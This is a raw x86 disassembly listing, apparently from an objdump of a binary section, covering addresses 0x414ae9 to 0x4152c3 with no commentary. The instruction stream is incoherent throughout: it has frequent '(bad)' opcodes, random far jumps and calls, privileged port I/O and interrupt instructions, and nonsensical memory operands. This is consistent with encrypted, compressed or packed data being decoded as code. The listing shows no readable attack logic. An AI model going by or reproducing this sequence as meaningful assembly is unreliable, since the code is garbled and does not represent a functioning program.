  414ae9:	fimul  DWORD PTR [edx+0x721b7170]
  414aef:	jl     0x414a7d
  414af1:	mov    dh,0x63
  414af3:	xchg   DWORD PTR [ebx],ebp
  414af5:	xor    bl,bh
  414af7:	push   0xffffffcf
  414af9:	push   esi
  414afa:	into   
  414afb:	sub    ebx,ecx
  414afd:	in     al,dx
  414afe:	(bad)  
  414aff:	inc    DWORD PTR [ecx]
  414b01:	mov    gs,ebp
  414b03:	add    BYTE PTR [esi+0x3570248a],bh
  414b09:	hlt    
  414b0a:	inc    ecx
  414b0b:	add    al,0xf
  414b0d:	sbb    eax,0x5733602e
  414b12:	sub    DWORD PTR [ebp-0x4f],esp
  414b15:	rol    DWORD PTR [esi-0x3c80636e],0xf
  414b1c:	je     0x414b81
  414b1e:	jmp    0x414b08
  414b20:	fs push eax
  414b22:	adc    ebx,ebx
  414b24:	dec    DWORD PTR ds:0x5fca93d5
  414b2a:	rcr    DWORD PTR [edx],1
  414b2c:	icebp  
  414b2d:	xor    ebp,DWORD PTR [ebx+esi*8+0x4b]
  414b31:	or     BYTE PTR ds:0x7c1eabaa,dh
  414b37:	stos   DWORD PTR es:[edi],eax
  414b38:	adc    eax,0xe822af34
  414b3d:	sti    
  414b3e:	jne    0x414b58
  414b40:	sub    BYTE PTR [ebx-0x4],bh
  414b43:	(bad)  
  414b44:	sub    eax,0x91b4e6b6
  414b49:	js     0x414b5d
  414b4b:	test   DWORD PTR [ecx-0x58c43f7b],0x7dfd72ec
  414b55:	mov    al,ds:0x8a5c4cd2
  414b5a:	shr    DWORD PTR [ebx+ecx*8],cl
  414b5d:	test   BYTE PTR [eax+0x12c77eb9],ah
  414b63:	popa   
  414b64:	xor    ch,0x57
  414b67:	xor    DWORD PTR [ecx+0x1f5fbe92],edx
  414b6d:	test   DWORD PTR [ebp+0x65cda734],ebx
  414b73:	in     al,0x6e
  414b75:	inc    eax
  414b76:	(bad)  
  414b77:	lahf   
  414b78:	into   
  414b79:	or     dl,bh
  414b7b:	(bad)  
  414b7c:	dec    BYTE PTR [esp+eax*2]
  414b7f:	not    DWORD PTR [esi]
  414b81:	fcom   QWORD PTR [ebp-0x35]
  414b84:	mov    cl,0x1d
  414b86:	ret    0x40e2
  414b89:	inc    esi
  414b8a:	push   cs
  414b8b:	(bad)  
  414b8c:	xor    al,0x9a
  414b8e:	in     eax,dx
  414b8f:	int3   
  414b90:	mov    edx,DWORD PTR [esi+esi*4]
  414b93:	call   0x5b0d4216
  414b98:	aad    0xe6
  414b9a:	push   edx
  414b9b:	mov    esi,0xe616380e
  414ba0:	imul   edx,DWORD PTR [edx],0x1a
  414ba3:	fcomip st,st(1)
  414ba5:	mov    ah,BYTE PTR [eax-0x10ee0e4c]
  414bab:	push   ss
  414bac:	adc    eax,DWORD PTR [edi]
  414bae:	cmp    edi,DWORD PTR [edi]
  414bb0:	add    al,0x8b
  414bb2:	fisub  DWORD PTR [edx]
  414bb4:	push   ds
  414bb5:	mov    dl,0xf3
  414bb7:	icebp  
  414bb8:	sub    eax,0x36b70af8
  414bbd:	sub    eax,0xa4640cf4
  414bc2:	mov    edx,0x3b5424f1
  414bc7:	mov    esp,0x9d454b4d
  414bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bcd:	mov    ds:0xc531637d,eax
  414bd2:	xor    ah,dh
  414bd4:	(bad)  
  414bd5:	shr    DWORD PTR [ebp+0x14c2db6a],0x3b
  414bdc:	xchg   esi,eax
  414bdd:	dec    ebx
  414bde:	sar    DWORD PTR [eax],0x62
  414be1:	out    dx,al
  414be2:	aam    0x38
  414be4:	xchg   esi,eax
  414be5:	mov    eax,0x608cd552
  414bea:	jmp    0x5e2e:0x57a40713
  414bf1:	dec    ebx
  414bf2:	push   cs
  414bf3:	shl    BYTE PTR [eax+eiz*4-0x6e],cl
  414bf7:	cwde   
  414bf8:	cmp    ebx,DWORD PTR [edi+0x29]
  414bfb:	fsub   st,st(2)
  414bfd:	adc    ch,BYTE PTR [ebx-0x4b3142]
  414c03:	push   edx
  414c04:	je     0x414c5b
  414c06:	repz (bad) [edi-0x1fd9d36d]
  414c0d:	jae    0x414c64
  414c0f:	ja     0x414b9a
  414c11:	popa   
  414c12:	push   eax
  414c13:	lahf   
  414c14:	pop    esi
  414c15:	pop    ds
  414c16:	cdq    
  414c17:	es in  al,0x98
  414c1a:	push   esp
  414c1b:	neg    DWORD PTR [ecx-0x24]
  414c1e:	fsubr  QWORD PTR [esi+0x3ec3ec01]
  414c24:	repz das 
  414c26:	(bad)  
  414c27:	in     eax,dx
  414c28:	push   esp
  414c29:	stos   BYTE PTR es:[edi],al
  414c2a:	loopne 0x414c5e
  414c2c:	xchg   BYTE PTR [edi+eiz*1-0x40],ch
  414c30:	add    BYTE PTR [edx-0x1b1cc973],0xcb
  414c37:	add    eax,0x129d56c7
  414c3c:	shl    dl,1
  414c3e:	fwait
  414c3f:	rcr    DWORD PTR [ecx],cl
  414c41:	xchg   ebx,eax
  414c42:	addr16 push esp
  414c44:	aas    
  414c45:	sbb    DWORD PTR [ecx+edi*1-0x60851712],0xffffffb6
  414c4d:	cmp    edi,DWORD PTR [edi+edi*8-0x42]
  414c51:	fcmovnbe st,st(1)
  414c53:	mov    eax,ds:0x90e29a3c
  414c58:	mov    ch,0x8c
  414c5a:	inc    edx
  414c5b:	cmp    BYTE PTR [esi-0x643e729b],ah
  414c61:	dec    ebp
  414c62:	sahf   
  414c63:	push   ebp
  414c64:	imul   esi,DWORD PTR [ebp+0x35],0xc0bd52c9
  414c6b:	adc    ah,BYTE PTR [ebp-0x29e2d70c]
  414c71:	ror    DWORD PTR [edx+ebp*2],cl
  414c74:	mov    ch,0xbd
  414c76:	or     eax,0xf5647425
  414c7b:	jo     0x414cd3
  414c7d:	pop    ss
  414c7e:	outs   dx,DWORD PTR ds:[esi]
  414c7f:	mov    DWORD PTR [esi],ebp
  414c81:	ret    
  414c82:	lods   al,BYTE PTR ds:[esi]
  414c83:	xchg   esi,eax
  414c84:	les    ebp,FWORD PTR [edi-0x25]
  414c87:	jne    0x414ca9
  414c89:	not    DWORD PTR [edi]
  414c8b:	xor    eax,0x5b664ca9
  414c90:	(bad)  
  414c91:	xor    BYTE PTR [edi+0x5d],ah
  414c94:	mov    dl,0x6b
  414c96:	(bad)  
  414c97:	xlat   BYTE PTR ds:[ebx]
  414c98:	mov    ds:0xa6e7a886,al
  414c9d:	xchg   esi,eax
  414c9e:	and    bh,BYTE PTR [eax+0x3b1fe9c5]
  414ca4:	pop    eax
  414ca5:	cmp    ecx,eax
  414ca7:	jo     0x414d11
  414ca9:	fadd   DWORD PTR [edx]
  414cab:	clc    
  414cac:	push   ecx
  414cad:	pushf  
  414cae:	adc    edx,DWORD PTR [ebp+0x56]
  414cb1:	popf   
  414cb2:	gs mov cl,0x8e
  414cb5:	in     eax,0x28
  414cb7:	(bad)  [esi+0x1]
  414cba:	popf   
  414cbb:	jge    0x414cdf
  414cbd:	shl    DWORD PTR [ecx],1
  414cbf:	mov    esi,DWORD PTR es:[ebp-0x2cc9a187]
  414cc6:	in     al,dx
  414cc7:	cld    
  414cc8:	jmp    0x150e6e85
  414ccd:	sbb    BYTE PTR [edi+0x79],dl
  414cd0:	mov    ds:0xfac49d69,eax
  414cd5:	bound  esi,QWORD PTR [ebx-0x4b]
  414cd8:	and    DWORD PTR [esi-0x1d49e9d],ebp
  414cde:	jmp    0x442a:0x3c21b314
  414ce5:	jnp    0x414cbb
  414ce7:	ret    0x86d4
  414cea:	xchg   ecx,eax
  414ceb:	xchg   esp,eax
  414cec:	ss dec edx
  414cee:	or     eax,0x6da1854
  414cf3:	push   0xfffffffb
  414cf5:	test   al,0xe9
  414cf7:	dec    ecx
  414cf8:	aas    
  414cf9:	sbb    ch,BYTE PTR [ecx-0x30]
  414cfc:	lahf   
  414cfd:	stos   DWORD PTR es:[edi],eax
  414cfe:	sti    
  414cff:	xor    eax,0xb5ac1a74
  414d04:	cmp    al,0x0
  414d06:	test   BYTE PTR [ebx+0x1d4accbd],bl
  414d0c:	repz and al,0xaa
  414d0f:	and    al,0x8f
  414d11:	xor    al,0x49
  414d13:	pop    edi
  414d14:	std    
  414d15:	sbb    eax,0x3a6be115
  414d1a:	inc    ebx
  414d1b:	sbb    DWORD PTR [eax+eiz*8+0x5a3a9d75],esp
  414d22:	lea    ebx,[edx+0x4ef03ecf]
  414d28:	mov    ecx,0x687a2a43
  414d2d:	mov    bl,0x5c
  414d2f:	adc    BYTE PTR [ecx],ch
  414d31:	int    0xfe
  414d33:	or     BYTE PTR [eax],al
  414d35:	or     BYTE PTR [eax-0x47ec61ca],dl
  414d3b:	imul   esp,DWORD PTR [ecx+0x6c],0xffffffec
  414d3f:	jnp    0x414ced
  414d41:	fstp   DWORD PTR [eax-0x773879ba]
  414d47:	mov    edi,0xf83991fb
  414d4c:	lods   eax,DWORD PTR ds:[esi]
  414d4d:	sbb    cl,0x3d
  414d50:	sub    al,BYTE PTR [edi+eiz*8]
  414d53:	xchg   ebp,eax
  414d54:	clc    
  414d55:	push   esp
  414d56:	and    ah,0x6d
  414d59:	lds    esi,FWORD PTR [ebp+0x12]
  414d5c:	fsubr  QWORD PTR [ebx]
  414d5e:	add    ch,dl
  414d60:	jecxz  0x414cf9
  414d62:	pusha  
  414d63:	mov    dl,0x31
  414d65:	xor    eax,0xa4b12b1e
  414d6b:	adc    DWORD PTR [ecx+0x46d695d4],edx
  414d71:	jmp    0xcef6:0x9d42435e
  414d78:	(bad)  
  414d79:	lea    esi,ds:0xe6fc1a12
  414d7f:	sbb    DWORD PTR [ebx-0x2096de29],ebp
  414d85:	jp     0x414d11
  414d87:	mov    edi,0x1d11910c
  414d8c:	sti    
  414d8d:	icebp  
  414d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d8f:	mov    ecx,0x4be28dd3
  414d94:	and    eax,0xf60efb9b
  414d99:	push   esp
  414d9a:	cmp    bh,dl
  414d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d9d:	shr    DWORD PTR [esi+0x6b49d1b5],1
  414da3:	shr    DWORD PTR [ebx-0x5b],0xea
  414da7:	ds (bad) 
  414da9:	repnz out dx,al
  414dab:	int    0xdf
  414dad:	fwait
  414dae:	shr    DWORD PTR [edx],1
  414db0:	sub    edx,DWORD PTR [esi-0x55]
  414db3:	jecxz  0x414df6
  414db5:	push   eax
  414db6:	aas    
  414db7:	ret    0xb948
  414dba:	pop    edx
  414dbb:	mov    ch,0x9c
  414dbd:	pop    esp
  414dbe:	loopne 0x414dc9
  414dc0:	push   ecx
  414dc1:	sub    dl,BYTE PTR [eax-0x6d]
  414dc4:	xchg   esi,eax
  414dc5:	cmp    BYTE PTR [ebx],ch
  414dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dc8:	cmp    eax,0x943573f9
  414dcd:	outs   dx,BYTE PTR ds:[esi]
  414dce:	(bad)  
  414dcf:	jge    0x414dcf
  414dd1:	push   ecx
  414dd2:	pop    ecx
  414dd3:	mov    eax,0xb31fa1d8
  414dd8:	push   es
  414dd9:	in     eax,dx
  414dda:	sub    esp,DWORD PTR [esi+0x4a]
  414ddd:	xchg   esp,eax
  414dde:	pop    ecx
  414ddf:	pop    edi
  414de0:	out    0x62,eax
  414de2:	nop
  414de3:	(bad)  [ebp-0xc6a2c77]
  414de9:	xchg   esi,eax
  414dea:	cwde   
  414deb:	jae    0x414e00
  414ded:	push   ds
  414dee:	cmp    BYTE PTR [edx*1+0x68642dc8],ch
  414df5:	sub    eax,0xa7d82a34
  414dfa:	mov    ss,ecx
  414dfc:	and    cl,dh
  414dfe:	inc    edx
  414dff:	cs mov ebx,0xc4fc85c3
  414e05:	cmp    BYTE PTR [eax],bl
  414e07:	fs or  al,0x57
  414e0a:	jo     0x414e46
  414e0c:	pop    edx
  414e0d:	push   edi
  414e0e:	and    ebp,DWORD PTR [ebx]
  414e10:	popf   
  414e11:	mov    ch,0x6c
  414e13:	push   es
  414e14:	dec    ebp
  414e15:	inc    dh
  414e17:	push   ebp
  414e18:	jecxz  0x414e10
  414e1a:	test   BYTE PTR [ecx+0x33],bh
  414e1d:	ror    ah,cl
  414e1f:	retf   
  414e20:	shl    DWORD PTR [edx],1
  414e22:	push   esp
  414e23:	mov    ah,0x86
  414e25:	push   esp
  414e26:	and    al,0xe1
  414e28:	fistp  QWORD PTR [eax-0x67a69b1d]
  414e2e:	test   eax,0x31045a2e
  414e33:	das    
  414e34:	repnz xchg ecx,eax
  414e36:	jno    0x414e40
  414e38:	and    al,BYTE PTR [ebx-0x55]
  414e3b:	xor    DWORD PTR [edi+ebx*8+0x6fdd8b02],0xef7747bc
  414e46:	in     al,0x66
  414e48:	(bad)  
  414e49:	push   eax
  414e4a:	retf   0xc863
  414e4d:	dec    eax
  414e4e:	ds pop ecx
  414e50:	jmp    FWORD PTR [ebp-0x51]
  414e53:	mov    edi,0x95f6be9d
  414e58:	adc    bl,0x66
  414e5b:	cmp    al,0x80
  414e5d:	dec    ecx
  414e5e:	mov    eax,0xc1077aa0
  414e63:	jecxz  0x414e3d
  414e65:	adc    DWORD PTR [esi],eax
  414e67:	inc    ebx
  414e68:	ins    DWORD PTR es:[edi],dx
  414e69:	call   0xc59b3474
  414e6e:	loopne 0x414ee1
  414e70:	dec    ebp
  414e71:	mov    ds:0x2cb0c136,eax
  414e76:	ret    0x643c
  414e79:	imul   ebx,DWORD PTR [edi+0x25d5cb62],0x7f
  414e80:	or     eax,0x8e3d2ce4
  414e85:	jmp    0x414e85
  414e87:	xchg   edi,eax
  414e88:	sub    DWORD PTR [edi+0x1e5c3b3c],eax
  414e8e:	pushf  
  414e8f:	pop    es
  414e90:	pop    edi
  414e91:	repnz and BYTE PTR [ebx],dh
  414e94:	dec    edi
  414e95:	inc    esi
  414e96:	pop    edi
  414e97:	push   eax
  414e98:	dec    esp
  414e99:	imul   ebp,DWORD PTR [ebp-0x42],0x7119d725
  414ea0:	aas    
  414ea1:	lahf   
  414ea2:	push   0x65
  414ea4:	dec    ebx
  414ea5:	(bad)  
  414ea6:	jecxz  0x414e87
  414ea8:	xchg   esi,eax
  414ea9:	mov    DWORD PTR [ebx],edx
  414eab:	test   ax,0x7ebe
  414eaf:	inc    ecx
  414eb0:	add    al,0xbc
  414eb2:	jmp    0x2f7f9bd1
  414eb7:	or     eax,0x8d55461e
  414ebc:	(bad)
  414ec0:	or     ebx,eax
  414ec2:	or     eax,0xc4f2a340
  414ec7:	pop    ds
  414ec8:	out    dx,al
  414ec9:	(bad)  
  414eca:	dec    esp
  414ecb:	in     eax,dx
  414ecc:	cli    
  414ecd:	mov    bl,0x13
  414ecf:	mov    ch,0x78
  414ed1:	std    
  414ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed3:	push   ecx
  414ed4:	jge    0x414e6d
  414ed6:	cld    
  414ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed8:	or     al,0xdc
  414eda:	or     ch,ah
  414edc:	enter  0xdb77,0xa0
  414ee0:	xchg   ebp,eax
  414ee1:	xchg   edi,eax
  414ee2:	aaa    
  414ee3:	jl     0x414f63
  414ee5:	push   0x593b9ee9
  414eea:	push   ebx
  414eeb:	mov    ebp,0xff51b30d
  414ef0:	cmp    al,0x7f
  414ef2:	mov    ch,0xb9
  414ef4:	mov    cl,0x51
  414ef6:	push   0x1fb7a3fa
  414efb:	loopne 0x414e89
  414efd:	mov    esp,0x4a16d3e7
  414f02:	mov    eax,ds:0x3dc03f43
  414f07:	mov    ecx,0x5cb3ddc4
  414f0c:	outs   dx,BYTE PTR ds:[esi]
  414f0d:	sbb    eax,0xc526a330
  414f12:	xor    bl,BYTE PTR [edi]
  414f14:	outs   dx,BYTE PTR ds:[esi]
  414f15:	fidivr DWORD PTR [edi-0x1d]
  414f18:	mov    ebx,0x841ae159
  414f1d:	mov    edx,0x195a91b9
  414f22:	jl     0x414f9d
  414f24:	pop    edx
  414f25:	inc    ebp
  414f26:	mov    al,0x6a
  414f28:	bound  edx,QWORD PTR [esp+edi*4+0x6e]
  414f2c:	shr    al,0x3
  414f2f:	push   ecx
  414f30:	js     0x414ee3
  414f32:	jbe    0x414f3b
  414f34:	pop    eax
  414f35:	jb     0x414f63
  414f37:	pop    edx
  414f38:	loop   0x414f95
  414f3a:	dec    ebx
  414f3b:	sbb    al,0x3
  414f3d:	ret    
  414f3e:	imul   ecx,DWORD PTR [ecx-0x5835441c],0x112e0c56
  414f48:	sysenter 
  414f4a:	xchg   ebp,eax
  414f4b:	call   0xde17:0xb19f0c76
  414f52:	dec    esp
  414f53:	iret   
  414f54:	arpl   WORD PTR [edx],di
  414f56:	sub    bl,bl
  414f58:	or     eax,0xefb68d9a
  414f5d:	mov    ebx,0xb42a96b1
  414f62:	sub    DWORD PTR [edx],0xffffffb3
  414f65:	sbb    BYTE PTR [eax],dh
  414f67:	test   BYTE PTR [edx-0x4c],0xc2
  414f6b:	lods   al,BYTE PTR ds:[esi]
  414f6c:	xlat   BYTE PTR ds:[ebx]
  414f6d:	inc    BYTE PTR [ebp+0x25]
  414f70:	iret   
  414f71:	pop    es
  414f72:	jb     0x414f74
  414f74:	cmc    
  414f75:	ret    0x4d9b
  414f78:	lock lds ebx,FWORD PTR [ebx-0x64dcb7f1]
  414f7f:	std    
  414f80:	aad    0x40
  414f82:	mov    cl,0x93
  414f84:	sub    al,0x38
  414f86:	retf   
  414f87:	mov    bl,0x1b
  414f89:	pop    ds
  414f8a:	dec    esi
  414f8b:	(bad)  
  414f8d:	pop    eax
  414f8e:	xor    eax,0x268944a8
  414f93:	mov    ds:0x205fad30,al
  414f98:	push   ebp
  414f99:	jbe    0x414f49
  414f9b:	repz call 0xc4ce5529
  414fa1:	test   DWORD PTR gs:[esi+0x37],edx
  414fa5:	ds fdiv st,st(1)
  414fa8:	sub    ebp,DWORD PTR [ecx-0x394c2573]
  414fae:	and    DWORD PTR [ebx+0x56],0x2d
  414fb2:	mov    bh,al
  414fb4:	inc    ebx
  414fb5:	test   DWORD PTR [esi+0x66],ebp
  414fb8:	mov    esi,0x979b98d6
  414fbd:	loope  0x414fbb
  414fbf:	sub    eax,0xb065545b
  414fc4:	ret    
  414fc5:	fsub   QWORD PTR [eax+0x1]
  414fc8:	cmp    al,0x8f
  414fca:	ret    
  414fcb:	scas   eax,DWORD PTR es:[edi]
  414fcc:	fstp   TBYTE PTR [esp+edx*8]
  414fcf:	in     al,0xbf
  414fd1:	in     al,0xde
  414fd3:	sub    al,0xc2
  414fd5:	xchg   DWORD PTR [ebp+0x3b],esi
  414fd8:	push   ebx
  414fd9:	and    esp,0xffffffb6
  414fdc:	call   0xca1e:0x7cff624f
  414fe3:	push   esp
  414fe4:	add    DWORD PTR [edi-0x17],eax
  414fe7:	add    eax,0x5c79e70b
  414fec:	loope  0x414fcd
  414fee:	jl     0x414ff2
  414ff0:	sub    DWORD PTR [eax-0x1f5dd332],ebx
  414ff6:	mov    al,0x80
  414ff8:	xchg   esi,eax
  414ff9:	fadd   DWORD PTR [eax]
  414ffb:	(bad)  
  414ffc:	mov    ah,0x53
  414ffe:	and    ah,ch
  415000:	inc    ebx
  415001:	push   edx
  415002:	(bad)  
  415003:	mov    eax,ds:0xc004f4f0
  415008:	adc    BYTE PTR [edi+0x37],dh
  41500b:	xchg   ecx,eax
  41500c:	mov    DWORD PTR [edi+0x33],0xb000f921
  415013:	inc    edx
  415014:	aam    0xd
  415016:	xchg   ebx,eax
  415017:	std    
  415018:	jg     0x41500c
  41501a:	fist   WORD PTR [edi+0x34]
  41501d:	cmovp  eax,DWORD PTR [eax]
  415020:	inc    ebp
  415021:	jg     0x414ffd
  415023:	fistp  DWORD PTR [esi-0x59]
  415026:	fistp  DWORD PTR [eax-0x73]
  415029:	jns    0x415034
  41502b:	lock sub edx,DWORD PTR [eax+0x4e8376f9]
  415032:	dec    esp
  415033:	mov    ah,ch
  415035:	pop    ecx
  415036:	test   eax,0x1b0f9c51
  41503b:	jmp    0x5d3c:0x91d31a35
  415042:	jecxz  0x4150b8
  415044:	xor    eax,0xd14348ed
  415049:	data16 xor cl,bh
  41504c:	xor    eax,0x4db0e5a1
  415051:	jb     0x41507d
  415053:	cmc    
  415054:	jb     0x4150b0
  415056:	and    edx,esp
  415058:	jl     0x415059
  41505a:	cmc    
  41505b:	mov    ds:0xe8d20df,eax
  415060:	mov    eax,0x67497989
  415065:	sub    esi,DWORD PTR [ebx+0xd]
  415068:	jge    0x41502a
  41506a:	push   0xffffffd6
  41506c:	push   edi
  41506d:	pop    eax
  41506e:	not    DWORD PTR [esi]
  415070:	jecxz  0x4150d5
  415072:	sub    cl,BYTE PTR [ecx+0x182d9252]
  415078:	push   es
  415079:	xchg   esi,eax
  41507a:	pop    es
  41507b:	jbe    0x415055
  41507d:	cdq    
  41507e:	jae    0x1ea449e9
  415084:	fcomp  QWORD PTR [ebx]
  415086:	(bad)  
  415087:	xor    BYTE PTR [eax+0x20],ch
  41508a:	sahf   
  41508b:	xchg   ebx,eax
  41508c:	fcmovnbe st,st(7)
  41508e:	sub    ebx,DWORD PTR [eax-0x60]
  415091:	or     eax,0x119edc7a
  415096:	jl     0x4150c0
  415098:	pop    ds
  415099:	fld    DWORD PTR [ecx+0x276c57ec]
  41509f:	and    DWORD PTR [ebp-0x56],ecx
  4150a2:	or     cl,BYTE PTR ds:0x53d57a9c
  4150a8:	jl     0x41510f
  4150aa:	add    ah,BYTE PTR [esi-0xc]
  4150ad:	push   esp
  4150ae:	(bad)  
  4150af:	aam    0x96
  4150b1:	ret    0x167
  4150b4:	cwde   
  4150b5:	sub    DWORD PTR [eax-0xc0a348d],0x43d5caa9
  4150bf:	mov    eax,ds:0xcc98d684
  4150c4:	dec    edx
  4150c5:	in     al,dx
  4150c6:	mov    dh,0x95
  4150c8:	pushf  
  4150c9:	shl    BYTE PTR [edi-0x2d76342a],0x14
  4150d0:	mov    ds:0xfafb55a4,al
  4150d5:	jo     0x415156
  4150d7:	cmp    al,0x97
  4150d9:	mov    eax,ds:0xe01da3b1
  4150de:	fbld   TBYTE PTR [ecx]
  4150e0:	out    dx,eax
  4150e1:	std    
  4150e2:	int3   
  4150e3:	stos   BYTE PTR es:[edi],al
  4150e4:	inc    ecx
  4150e5:	or     BYTE PTR [ecx],ch
  4150e7:	test   esi,ebp
  4150e9:	outs   dx,DWORD PTR ds:[esi]
  4150ea:	mov    ecx,0x2f3ee5ef
  4150ef:	mov    eax,0x44c8ebd4
  4150f4:	jmp    0x415119
  4150f6:	xor    eax,0x96109d82
  4150fb:	sbb    esp,DWORD PTR [ebp-0x57545bb]
  415101:	push   ss
  415102:	sub    edx,DWORD PTR [esi]
  415104:	shl    DWORD PTR [ebx],1
  415106:	cmp    BYTE PTR [ebx+0x18],0xd9
  41510a:	pop    eax
  41510b:	add    ebp,DWORD PTR [ebp+0x3dcc7c26]
  415111:	ret    
  415112:	mov    ds:0x71cf8bcb,al
  415117:	in     al,0x70
  415119:	mov    edi,0xc755aa2c
  41511e:	ins    BYTE PTR es:[edi],dx
  41511f:	rcr    DWORD PTR [ebp-0x5d18b831],cl
  415125:	xchg   esi,eax
  415126:	xchg   esp,eax
  415128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415129:	sub    al,0x5
  41512b:	xchg   DWORD PTR [esi+0x10f09c6d],ecx
  415131:	dec    ebx
  415132:	jno    0x4150cd
  415134:	inc    esp
  415135:	mov    BYTE PTR [edi+0x6f],cl
  415138:	sbb    al,0x78
  41513a:	(bad)  
  41513b:	push   edx
  41513c:	inc    edx
  41513d:	mov    edx,edi
  41513f:	xchg   esi,eax
  415140:	scas   eax,DWORD PTR es:[edi]
  415141:	out    dx,eax
  415142:	sub    al,0x7c
  415144:	xchg   esi,eax
  415145:	and    al,0xb9
  415147:	aas    
  415148:	dec    esi
  415149:	and    DWORD PTR [ebx+edi*4+0x2f],ecx
  41514d:	push   ebp
  41514e:	and    BYTE PTR [edx+0x5e],ch
  415151:	aaa    
  415152:	int3   
  415153:	jecxz  0x4150e4
  415155:	(bad)  [ecx]
  415157:	mov    bl,0x84
  415159:	retf   
  41515a:	jmp    0x6249:0x733a79dc
  415161:	jns    0x4151bd
  415163:	aaa    
  415164:	or     al,0xb4
  415166:	call   0xd512a855
  41516b:	pop    edi
  41516c:	sbb    DWORD PTR [edx],esp
  41516e:	and    ah,BYTE PTR [edi+0x38e0af1a]
  415174:	dec    ebx
  415175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415176:	aam    0x33
  415178:	call   0x59bf1a3
  41517d:	cmp    edi,ecx
  41517f:	out    dx,al
  415180:	dec    eax
  415182:	or     DWORD PTR [edx-0x50],ecx
  415185:	fs dec eax
  415187:	inc    ecx
  415188:	stos   DWORD PTR es:[edi],eax
  415189:	jb     0x41513f
  41518b:	ret    0xf2c1
  41518e:	repz xchg edx,eax
  415190:	ins    DWORD PTR es:[edi],dx
  415191:	adc    BYTE PTR [ecx-0x31a39ae7],0xd3
  415198:	and    eax,0x4b1618ab
  41519d:	mov    eax,0x848addc3
  4151a2:	daa    
  4151a3:	ror    BYTE PTR [edi],cl
  4151a5:	addr16 repz and al,0x50
  4151a9:	cmp    ch,dl
  4151ab:	fisub  WORD PTR [ebp-0x61]
  4151ae:	cmp    al,0xac
  4151b0:	xor    cl,BYTE PTR [edx-0x15]
  4151b3:	xor    DWORD PTR [ebx],edx
  4151b5:	outs   dx,DWORD PTR ds:[esi]
  4151b6:	ja     0x415168
  4151b8:	adc    ebp,DWORD PTR [ebx+0x6f]
  4151bb:	retf   
  4151bc:	add    DWORD PTR ds:0x3f607067,eax
  4151c2:	fld    QWORD PTR [ecx]
  4151c4:	mov    esp,0x76146165
  4151c9:	mov    cl,0x14
  4151cb:	and    ebx,DWORD PTR [esi+0x213699b0]
  4151d1:	sbb    al,0xe2
  4151d3:	inc    DWORD PTR [esi-0x52dfe865]
  4151d9:	rol    BYTE PTR [esi],0xe8
  4151dc:	jle    0x4151d7
  4151de:	xchg   esp,eax
  4151df:	jl     0x415202
  4151e1:	(bad)  
  4151e2:	or     DWORD PTR [edx-0x10d883d5],edi
  4151e8:	adc    DWORD PTR [ebx-0xa],ebp
  4151eb:	sub    DWORD PTR [esi+ebx*4+0x1b],esp
  4151ef:	les    edi,FWORD PTR [ebp-0xf399159]
  4151f5:	and    BYTE PTR [esi+0x62],0x63
  4151f9:	and    dh,BYTE PTR [edx-0xcc8bf52]
  4151ff:	mov    ebx,0xf91fa1c5
  415204:	int3   
  415205:	push   cs
  415206:	lods   al,BYTE PTR ds:[esi]
  415207:	(bad)  [edi+0x1d9ec15f]
  41520d:	or     ah,BYTE PTR ds:0x85a553fd
  415213:	pop    edx
  415214:	or     edi,DWORD PTR [ebx]
  415216:	aaa    
  415217:	sub    al,0x58
  415219:	or     BYTE PTR [edi+edi*8],ch
  41521c:	jp     0x4151b2
  41521e:	test   BYTE PTR [edx+0x4f914608],dl
  415224:	xchg   dh,cl
  415226:	push   cs
  415227:	lods   al,BYTE PTR ds:[esi]
  415228:	adc    al,0x5e
  41522a:	(bad)  
  41522b:	les    esi,FWORD PTR ds:[esi]
  41522e:	outs   dx,BYTE PTR ds:[esi]
  41522f:	dec    esp
  415230:	ffreep st(6)
  415232:	add    BYTE PTR [esi+0x26ba463b],dl
  415238:	jo     0x415243
  41523a:	push   ds
  41523b:	push   edx
  41523c:	dec    ecx
  41523d:	push   ds
  41523e:	add    BYTE PTR [eax-0x14],bl
  415241:	adc    ecx,DWORD PTR ss:[esi-0x1e10781b]
  415248:	stos   BYTE PTR es:[edi],al
  415249:	pop    es
  41524a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41524b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41524c:	mov    ds:0xda0f1f96,eax
  415251:	ja     0x4151e8
  415253:	cmp    dl,cl
  415255:	fwait
  415256:	cmp    DWORD PTR [ebp+0x1b],ecx
  415259:	scas   al,BYTE PTR es:[edi]
  41525a:	dec    eax
  41525b:	push   0x3e7a63cf
  415260:	pop    eax
  415261:	cmp    eax,0x6d116faa
  415266:	cmp    eax,0xcbaa21dc
  41526b:	inc    edx
  41526c:	ja     0x41524a
  41526e:	dec    ebp
  41526f:	daa    
  415270:	mov    esi,ss
  415272:	xchg   esp,eax
  415273:	xchg   edx,eax
  415274:	std    
  415275:	aam    0x1c
  415277:	mov    dl,0xbf
  415279:	push   esp
  41527a:	mov    eax,0x7cd76ae5
  41527f:	cmp    BYTE PTR ds:0x166814a,dl
  415285:	out    0x94,eax
  415287:	jecxz  0x415293
  415289:	in     al,dx
  41528a:	fstp   TBYTE PTR [ecx]
  41528c:	loopne 0x4152f3
  41528e:	push   esp
  41528f:	add    ebx,0xffffffd6
  415292:	and    eax,DWORD PTR [ebx]
  415294:	jl     0x4152b5
  415296:	in     eax,dx
  415297:	mov    al,0x9f
  415299:	cld    
  41529a:	(bad)  
  41529c:	or     eax,0xa0fb61f5
  4152a1:	cli    
  4152a2:	retf   
  4152a3:	mov    esi,0x996115b0
  4152a8:	sub    DWORD PTR [edx+0x48],ebx
  4152ab:	fbld   TBYTE PTR [ebx]
  4152ad:	bound  esi,QWORD PTR [ebx+0x49e8f319]
  4152b3:	jnp    0x415298
  4152b5:	scas   al,BYTE PTR es:[edi]
  4152b6:	int    0xd1
  4152b8:	xchg   DWORD PTR [edi+0x26],eax
  4152bb:	ret    0x8663
  4152be:	fsub   st(4),st
  4152c0:	(bad)  
  4152c1:	ss stos BYTE PTR es:[edi],al
  4152c3:	sub    DWORD PTR [eax-0x23068a86],edi
